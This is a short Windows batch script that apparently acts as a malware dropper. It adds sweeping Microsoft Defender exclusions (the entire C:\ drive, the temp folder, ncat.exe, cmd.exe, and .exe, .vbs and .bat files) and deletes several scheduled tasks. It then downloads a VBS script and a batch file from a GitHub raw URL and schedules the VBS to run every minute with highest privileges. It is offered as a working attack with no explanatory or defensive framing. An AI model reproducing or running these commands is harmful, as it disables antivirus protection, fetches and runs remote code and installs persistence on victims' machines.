powershell -Command Add-MpPreference -ExclusionPath "C:\tmp"
powershell -Command Add-MpPreference -ExclusionPath "C:\"
powershell -Command Add-MpPreference -ExclusionPath "%temp%"
powershell -Command Add-MpPreference -ExclusionProcess "ncat.exe"
powershell -Command Add-MpPreference -ExclusionProcess "cmd.exe"
powershell -Command Add-MpPreference -ExclusionExtension ".exe"
powershell -Command Add-MpPreference -ExclusionExtension "exe"
powershell -Command Add-MpPreference -ExclusionExtension ".vbs"
powershell -Command Add-MpPreference -ExclusionExtension ".bat"
schtasks /delete /tn "upgradef1" /f
schtasks /delete /tn "InstallRequests" /f
schtasks /delete /tn "RunPowerShellScript" /f
cd %temp%

curl https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/e.vbs-o e.vbs
curl https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/asd123.bat -o asd123.bat


schtasks /create /tn "TempVBS" /tr "%temp%\e.vbs" /sc minute /mo 1  /f /rl HIGHEST
